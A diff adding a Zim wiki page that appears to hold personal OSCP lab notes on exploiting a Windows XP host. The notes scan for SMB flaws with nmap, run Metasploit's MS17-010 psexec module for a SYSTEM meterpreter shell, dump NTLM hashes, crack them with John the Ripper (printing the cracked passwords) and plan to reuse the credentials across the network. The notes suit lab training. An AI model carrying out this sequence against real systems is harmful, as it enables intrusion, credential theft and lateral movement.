@@ -1,0 +1,35 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2021-01-10T11:32:31-05:00
+
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2021-01-10T09:49:34-05:00
+
+====== AV ======
+Created Sunday 10 January 2021
+
+1. First running the nessus scanner on 10.11.1.5 using a basic network scan I found that it was running windows XP and had a basic SMB vulnerability.
+2. I confirmed this vulnerability by running an nmap scan against it:
+	a. sudo nmap -p 139,445 --script=smb-vuln* 10.11.1.5
+{{./pasted_image.png}}
+3. I opened the metasploit console and searched ms17-010, I chose exploit/windows/smb/ms17_010_psexec based on previous experience and having a success rate with it. using this exploit I entered relevant information and ran the command. Below are the options used.
+	a. The IP used was my VPN connection. {{./pasted_image001.png}}
+4. Once I popped a meterpreter shell I ran the getuid command to see I had NT Authority
+5. With these priveleges I ran the hashdump command to get potential creds to run through john the ripper later. I plan to use those creds in the future across the network.
+	a. cat hashdump.txt | cut -d ":" -f 3,4 > hash1.txt
+	b. sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt ./OSCP/boxes/10.11.1.5/hash1.txt --fork=10
+===================================================================
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+//**Password: Password1**//
+alice:1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
+//**Password: aliceishere**//
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7:::
+{{./pasted_image.png}}
+==================================================================
+6. Lastly I searched for proof.txt and secret.txt, but only found proof.txt so I also searched for hidden files.
+	a. dir /s proof.txt secret.txt
+	b. dir C: /a:h /b /s 
+{{./pasted_image001.png}}
